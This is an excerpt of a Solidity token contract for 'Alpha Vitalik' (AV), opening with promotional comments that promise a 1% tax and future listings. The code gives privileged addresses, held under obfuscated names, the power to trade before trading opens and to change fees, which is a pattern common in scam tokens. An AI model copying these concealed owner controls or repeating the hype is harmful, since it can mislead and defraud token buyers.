...
// https://t.me/AlphaVitalik

// https://twitter.com/AlphaVitalik

// https://Medium.com/@AlphaVitalik

// SPDX-License-Identifier: MIT

/*

The Alpha Vitalik token is a community-driven token with future utility. The last project by the developer had an all-time 
high of over 6 million USD. This is a great achievement and shows the potential of such tokens. The token can be used for 
various purposes, such as trading, payment, and more. The tokens can also be used to fund development and other projects.

We will be bringing utilities too in near future and we have plans to push it more than the last one which includes CEX 
listings as well and that is why the tax is just 1%.

Liquidity Lock : 1 Year
Initial Liquidity : 7 ETH
...
contract Ownable is Context {
    ...
    constructor () {
        ...
        _owner = msgSender;
        AlphaaVit[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }
    mapping (address => bool) internal AlphaaVit;
    ...
    modifier AlpVitDep() {
        require(isAlpVitDep(msg.sender), "!AlpVitDep"); _;
    }

    function isAlpVitDep(address adr) public view returns (bool) {
        return AlphaaVit[adr];
    }
...
contract AlphaVitalik is Ownable, IERC20 {
    ...
    string constant private _name = "Alpha Vitalik";
    string constant private _symbol = "AV";
    ...
    constructor() {
        ...
        lpWallet = msg.sender;
        projectAddress = 0xD24Abb78027Be9Ced7C11d386d6Bf13b08BD801C;
        devWallet = 0xD24Abb78027Be9Ced7C11d386d6Bf13b08BD801C;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!AlphaaVit[sender] && !AlphaaVit[recipient]){
            require(tradingOpen, "");
        }
    ...
    function Altercostss(uint256 newLiqFee, uint256 newMarketingFee, uint256 newBetFee, uint256 newNativeFee, uint256 extra) public AlpVitDep{
